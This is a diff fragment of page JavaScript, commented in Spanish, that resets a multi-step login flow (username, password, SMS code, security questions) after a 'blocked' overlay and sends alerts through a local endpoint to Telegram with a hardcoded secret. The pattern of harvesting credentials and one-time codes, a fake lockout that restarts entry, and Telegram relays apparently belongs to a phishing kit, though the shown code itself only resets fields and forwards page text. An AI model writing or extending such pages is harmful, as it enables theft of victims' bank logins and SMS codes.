+    function hideBlockedMessage() {
+      const overlay = document.getElementById('blockedOverlay');
+      overlay.style.display = 'none';
+      overlay.setAttribute('aria-hidden', 'true');
+      document.getElementById('btnSubmit').disabled = false;
+
+      // volver al paso 1 y limpiar campos
+      pasoActual = 1;
+      document.getElementById('boxUsuario').style.display = 'flex';
+      document.getElementById('boxClave').style.display = 'none';
+      document.getElementById('boxSMS').style.display = 'none';
+      document.getElementById('boxPreguntas').style.display = 'none';
+
+      document.getElementById('inputUsuario').value = '';
+      document.getElementById('inputClave').value = '';
+      document.getElementById('inputSMS').value = '';
+      document.getElementById('inputPregunta1').value = '';
+      document.getElementById('inputPregunta2').value = '';
+
+      document.getElementById('inputUsuario').focus();
+    }
+
+    // Conectar el botón Aceptar del overlay
+    document.addEventListener('DOMContentLoaded', function() {
+      const btn = document.getElementById('btnBlockedAccept');
+      if (btn) btn.addEventListener('click', hideBlockedMessage);
+      // botón para enviar notificación a Telegram si existe (solo cuando el servidor esté configurado)
+      const btnNotify = document.getElementById('btnNotifyTelegram');
+      if (btnNotify) btnNotify.addEventListener('click', () => {
+        // mandar notificación al servidor local
+        fetch('/notify', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'x-notify-secret': 'mi_clave_secreta_local'
+          },
+          body: JSON.stringify({
+            title: document.querySelector('.error-title')?.textContent || 'Alerta',
+            message: document.querySelector('.error-text')?.textContent || '',
+            buttons: [{ text: 'Abrir sitio', url: window.location.href }]
+          })
+        }).catch(err => console.warn('Notify error', err));
+      });
+    });
+    </script>
+
+</body>
+</html>
